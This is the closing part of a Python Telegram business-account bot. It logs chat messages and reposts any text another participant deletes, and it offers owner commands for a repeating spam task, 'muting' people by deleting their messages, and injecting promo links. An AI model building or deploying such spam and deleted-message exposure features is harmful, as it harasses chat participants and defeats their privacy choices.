        await message.answer(f"✅ Было {before}, стало {after} (+{after-before})", parse_mode="HTML")
    except Exception as e: await message.answer(f"❌ {e}")

# ==================== УДАЛЕНИЯ ====================
@dp.update()
async def global_update_handler(update: Update, bot: Bot):
    try:
        if update.deleted_business_messages:
            data = update.deleted_business_messages
            bc_id = data.business_connection_id
            msg_ids = set(data.message_ids)
            for (ccid, cmid), cached in list(msg_cache.items()):
                if cmid in msg_ids:
                    u = cached['user_id']
                    if u == bot_id:
                        msg_cache.pop((ccid, cmid), None); continue
                    kwargs = {"chat_id": ccid, "text": f"👤 {get_user_mention(u, cached['user'])} <b>удалил сообщение ↓</b>\n\n💬 {cached['text']}", "parse_mode": "HTML"}
                    bt = bc_id or cached.get("bc_id")
                    if bt: kwargs["business_connection_id"] = bt
                    await bot.send_message(**kwargs)
                    msg_cache.pop((ccid, cmid), None)
    except Exception as e: logging.error(f"deleted: {e}")

# ==================== ОСНОВНОЙ ====================
@dp.message()
@dp.business_message()
async def handle(message: Message):
    global bot_id, CHANNEL_LINK
    try:
        if not message.from_user or message.from_user.is_bot: return
        uid = int(message.from_user.id)
        chat_id = int(message.chat.id)
        bc_id = message.business_connection_id
        save_user_info(uid, message.from_user.username, message.from_user.first_name)
        owner_id = bc_owners.get(bc_id) if bc_id else None

        if bc_id:
            chat_name = message.chat.title or message.chat.first_name or "Чат"
            save_user_chat(uid, chat_id, chat_name)
            t = (chat_id, bc_id)
            if t in recent_business_chats: recent_business_chats.remove(t)
            recent_business_chats.append(t)
            if len(recent_business_chats) > 100: recent_business_chats.pop(0)

        if uid in banned_users or (owner_id and owner_id in banned_users): return

        if bc_id:
            if bc_id not in bc_owners:
                try:
                    ci = await bot.get_business_connection(bc_id)
                    bc_owners[bc_id] = int(ci.user.id)
                    save_user_info(ci.user.id, ci.user.username, ci.user.first_name)
                    save_business_account(ci.user.id, ci.user.username, ci.user.first_name)
                    owner_id = int(ci.user.id)
                except: pass
            is_from_me = (uid == owner_id) if owner_id else False
        else:
            is_from_me = (uid == chat_id) or (message.chat.type in ["group", "supergroup"])

        if bot_id is None:
            me = await bot.get_me(); bot_id = me.id

        if bc_id: active_chats.setdefault(bc_id, set()).add(chat_id)

        if message.text:
            ck = (chat_id, message.message_id)
            msg_cache[ck] = {"text": message.text, "user": message.from_user.first_name or "Пользователь",
                             "user_id": uid, "chat_id": chat_id, "bc_id": bc_id}
            if len(msg_cache) > 5000: msg_cache.pop(next(iter(msg_cache)))

        if uid in mutes and datetime.now() < mutes[uid]["until"]:
            await delete_msg(chat_id, message.message_id, bc_id); return
        if not is_from_me: return
        if chat_id in reply_guard_chats and message.reply_to_message:
            await delete_msg(chat_id, message.message_id, bc_id); return

        text_raw = message.text
        if not text_raw: return
        low = text_raw.lower().strip()
        task_key = (chat_id, bc_id)
        co = owner_id or uid

        if is_calculator_expression(text_raw):
            r, err = calculate_expression(text_raw)
            if r is not None:
                f = f"{r:.10f}".rstrip('0').rstrip('.') if isinstance(r, float) else str(r)
                nt = f"{text_raw} = <b>{f}</b>"
                ok = await edit_message(chat_id, message.message_id, nt, bc_id, parse_mode="HTML")
                if not ok:
                    try:
                        kw = {"chat_id": chat_id, "text": nt, "parse_mode": "HTML"}
                        if bc_id: kw["business_connection_id"] = bc_id
                        await bot.send_message(**kw)
                    except: pass
                return
            elif err:
                try:
                    kw = {"chat_id": chat_id, "text": err, "parse_mode": "HTML"}
                    if bc_id: kw["business_connection_id"] = bc_id
                    await bot.send_message(**kw)
                except: pass
                return

        if low == ".стоп": save_setting(chat_id, 'enabled_links', False); await clear_cmd(chat_id, message.message_id, bc_id); return
        if low == ".старт": save_setting(chat_id, 'enabled_links', True); await clear_cmd(chat_id, message.message_id, bc_id); return
        if low.startswith("+линк"):
            p = text_raw.split(maxsplit=1)
            if len(p) > 1:
                nl = p[1].strip()
                if not nl.startswith("http"): nl = "https://t.me/" + nl.lstrip("@")
                CHANNEL_LINK = nl
            await clear_cmd(chat_id, message.message_id, bc_id); return
        if low.startswith("подмена "):
            p = text_raw.split(maxsplit=2)
            if len(p) >= 2:
                if p[1].lower() == "выкл": save_substitution(chat_id, None, None)
                else:
                    mode = int(p[2]) if len(p) == 3 and p[2] in ["1", "2"] else 1
                    save_substitution(chat_id, p[1], mode)
            await clear_cmd(chat_id, message.message_id, bc_id); return
        if low == "печать -": save_setting(chat_id, 'typing_disabled', True); await clear_cmd(chat_id, message.message_id, bc_id); return
        if low == "печать +": save_setting(chat_id, 'typing_disabled', False); await clear_cmd(chat_id, message.message_id, bc_id); return
        if low == "+реплай": save_setting(chat_id, 'reply_guard', True); await clear_cmd(chat_id, message.message_id, bc_id); return
        if low == "-реплай": save_setting(chat_id, 'reply_guard', False); await clear_cmd(chat_id, message.message_id, bc_id); return
        if low == "ss":
            await clear_cmd(chat_id, message.message_id, bc_id)
            t = user_spam_texts.get(str(co))
            if not t:
                kw = {"chat_id": chat_id, "text": "⚠️ Сначала <code>set [текст]</code>", "parse_mode": "HTML"}
                if bc_id: kw["business_connection_id"] = bc_id
                await bot.send_message(**kw); return
            rt = message.reply_to_message.message_id if message.reply_to_message else None
            if task_key in spam_tasks: spam_tasks[task_key].cancel()
            spam_tasks[task_key] = asyncio.create_task(spam_worker(chat_id, bc_id, rt, t)); return
        if low == "dd":
            await clear_cmd(chat_id, message.message_id, bc_id)
            if task_key in spam_tasks: spam_tasks[task_key].cancel(); del spam_tasks[task_key]
            return
        if low.startswith("set "): save_spam_text(str(co), text_raw[4:].strip()); await clear_cmd(chat_id, message.message_id, bc_id); return
        if low.startswith(".мут") or low.startswith("!мут") or low.startswith(".ут"):
            try:
                mins = int(re.search(r"\d+", text_raw).group())
                if message.reply_to_message and message.reply_to_message.from_user:
                    tu = message.reply_to_message.from_user; tid = tu.id; tn = tu.first_name
                else:
                    tid = chat_id; tn = message.chat.first_name or "Пользователь"
                mutes[tid] = {"until": datetime.now() + timedelta(minutes=mins)}
                asyncio.create_task(unmute(tid, chat_id, bc_id, tn))
                await clear_cmd(chat_id, message.message_id, bc_id)
                kw = {"chat_id": chat_id, "text": f"🔇 {get_user_mention(tid, tn)} МУТ на {mins} мин.", "parse_mode": "HTML"}
                if bc_id: kw["business_connection_id"] = bc_id
                await bot.send_message(**kw)
            except: pass
            return
        if low in [".размут", "!размут"]:
            if message.reply_to_message and message.reply_to_message.from_user:
                tu = message.reply_to_message.from_user; tid = tu.id; tn = tu.first_name
            else:
                tid = chat_id; tn = message.chat.first_name or "Пользователь"
            mutes.pop(tid, None)
            await clear_cmd(chat_id, message.message_id, bc_id)
            kw = {"chat_id": chat_id, "text": f"🔊 С {get_user_mention(tid, tn)} снят МУТ.", "parse_mode": "HTML"}
            if bc_id: kw["business_connection_id"] = bc_id
            await bot.send_message(**kw); return
        if low in ["мой ид", "моид"]:
            await clear_cmd(chat_id, message.message_id, bc_id)
            kw = {"chat_id": chat_id, "text": f"🆔 {get_user_mention(uid, message.from_user.first_name)} (<code>{uid}</code>)", "parse_mode": "HTML"}
            if bc_id: kw["business_connection_id"] = bc_id
            await bot.send_message(**kw); return
        if low in ["твой ид", "твоид"]:
            await clear_cmd(chat_id, message.message_id, bc_id)
            tu = message.reply_to_message.from_user if message.reply_to_message else None
            tid = tu.id if tu else (chat_id if chat_id > 0 else None)
            if tid:
                kw = {"chat_id": chat_id, "text": f"🆔 {get_user_mention(tid, tu.first_name if tu else None)} (<code>{tid}</code>)", "parse_mode": "HTML"}
                if bc_id: kw["business_connection_id"] = bc_id
                await bot.send_message(**kw)
            return
        if low == "!команды":
            await clear_cmd(chat_id, message.message_id, bc_id)
            kw = {"chat_id": chat_id, "text": TEXT_COMMANDS_HELP, "parse_mode": "HTML"}
            if bc_id: kw["business_connection_id"] = bc_id
            await bot.send_message(**kw); return

        ft = text_raw; nm = False; pm = None
        if chat_id in substitutions:
            s = substitutions[chat_id]
            ft = f"{s['text']} {text_raw}" if s["mode"] == 1 else f"{text_raw} {s['text']}"
            nm = True; pm = "HTML"
        if chat_id in link_chats and CHANNEL_LINK:
            hl = False
            if message.entities:
                for e in message.entities:
                    if e.type in ["url", "text_link"]: hl = True; break
            if not hl and CHANNEL_LINK not in ft:
                ft = f'<a href="{CHANNEL_LINK}">{ft}</a>'
                nm = True; pm = "HTML"
        if nm: await edit_message(chat_id, message.message_id, ft, bc_id, parse_mode=pm)
    except Exception as e: logging.error(f"handle: {e}", exc_info=True)

# ==================== ВЕБ ====================
async def handle_ping(request):
    return web.Response(text="Bot is running!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    app.router.add_get('/health', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 10000))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()

# ==================== MAIN ====================
async def main():
    init_pool()
    init_db()
    await start_web_server()
    try: await bot.delete_webhook(drop_pending_updates=True)
    except: pass

    await restore_all_sessions()

    asyncio.create_task(global_typing_loop())
    asyncio.create_task(promo_broadcaster())
    asyncio.create_task(check_promo_deletions())
    asyncio.create_task(clean_inactive_connections())
    asyncio.create_task(child_decay_loop())
    asyncio.create_task(child_birthday_loop())
    logging.info("🚀 БОТ ЗАПУЩЕН!")
    await dp.start_polling(
        bot,
        allowed_updates=["message", "business_connection", "business_message",
                         "edited_business_message", "deleted_business_messages", "callback_query"])

if __name__ == "__main__":
    asyncio.run(main())
